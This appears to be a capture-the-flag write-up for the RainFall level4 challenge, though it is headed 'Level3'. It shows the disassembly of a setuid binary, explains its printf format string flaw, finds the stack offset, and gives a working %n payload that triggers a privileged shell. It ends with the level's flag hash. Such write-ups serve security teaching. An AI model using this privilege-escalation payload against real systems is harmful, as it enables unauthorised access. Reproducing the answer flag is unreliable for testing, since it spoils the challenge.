# Level3

## 1. Initial Analysis
### 1.1 File Metadata & Permissions
```bash
level4@RainFall:~$ file level4 
level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
```
```bash
level4@RainFall:~$ ls -l ./level4 
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 ./level4
```
- **SetUID (s)**: The binary has the `s` bit on the owner's permissions, meaning it executes with the privileges of the file owner (`level5`) rather than the user running it (`level4`).
- **SetGID (s)**: Similarly, the group ID is set, allowing the process to inherit the `users` group permissions.
- **The Hint**: The goal is to exploit the binary to hijack its execution flow; because of these bits, any shell spawned will inherit `level5` privileges, allowing access to the next level's password.

## 2. Static Analysis with Objdump
```bash
level4@RainFall:~$ objdump -d ./level4 
```
```nasm
08048444 <p>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	8b 45 08             	mov    0x8(%ebp),%eax
 804844d:	89 04 24             	mov    %eax,(%esp)
 8048450:	e8 eb fe ff ff       	call   8048340 <printf@plt>
 8048455:	c9                   	leave  
 8048456:	c3                   	ret    

08048457 <n>:
 8048457:	55                   	push   %ebp
 8048458:	89 e5                	mov    %esp,%ebp
 804845a:	81 ec 18 02 00 00    	sub    $0x218,%esp
 8048460:	a1 04 98 04 08       	mov    0x8049804,%eax
 8048465:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048469:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 8048470:	00 
 8048471:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 8048477:	89 04 24             	mov    %eax,(%esp)
 804847a:	e8 d1 fe ff ff       	call   8048350 <fgets@plt>
 804847f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 8048485:	89 04 24             	mov    %eax,(%esp)
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	movl   $0x8048590,(%esp)
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
 80484a5:	c9                   	leave  
 80484a6:	c3                   	ret    

080484a7 <main>:
 80484a7:	55                   	push   %ebp
 80484a8:	89 e5                	mov    %esp,%ebp
 80484aa:	83 e4 f0             	and    $0xfffffff0,%esp
 80484ad:	e8 a5 ff ff ff       	call   8048457 <n>
 80484b2:	c9                   	leave  
 80484b3:	c3                   	ret    
 80484b4:	90                   	nop
 80484b5:	90                   	nop
 80484b6:	90                   	nop
 80484b7:	90                   	nop
 80484b8:	90                   	nop
 80484b9:	90                   	nop
 80484ba:	90                   	nop
 80484bb:	90                   	nop
 80484bc:	90                   	nop
 80484bd:	90                   	nop
 80484be:	90                   	nop
 80484bf:	90                   	nop
```

### 2.1 Vulnerability Analysis
p function receive a buffer in parameter then execute printf with this parameter and because there is no format specifier (like %s), printf parses the content of our buffer for its own specifiers. This triggers a Format String Vulnerability 

## 3. Exploitation Strategy
### 3.1 Target Identification
```nasm
 8048488:	e8 b7 ff ff ff       	call   8048444 <p>
 804848d:	a1 10 98 04 08       	mov    0x8049810,%eax
 8048492:	3d 44 55 02 01       	cmp    $0x1025544,%eax
 8048497:	75 0c                	jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08 	movl   $0x8048590,(%esp)
 80484a0:	e8 bb fe ff ff       	call   8048360 <system@plt>
```
If the values match (je), it executes system() to spawn a shell or output the password flag file. Therefore, our target is to write the value 0x1025544 into the memory address 0x08049810

### 3.2 Determining the Stack Offset
To use %n, we must know the position of our input string on the stack relative to printf. We send a unique "anchor" (AAAA) and observe where it appears in the memory dump:

```bash
 python -c "print 'AAAA' + ' %x'*12" | ./level4
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141
```
The value 0x41414141 (Hex for AAAA) appears at the 12th position. This confirms our Stack Offset is 12.

## 4. Payload Construction
- Target Destination Pointer: 0x08049810 (Represented in Little Endian format: \x10\x98\x04\x08).

- Value to inject: 0x1025544 -> 16930116 in base-10 decimal

the address of target take 4 bytes so we substract 4 from our value
$$16930116 - 4 = 16930112$$

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"'; cat) | ./level4
```

## flag
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a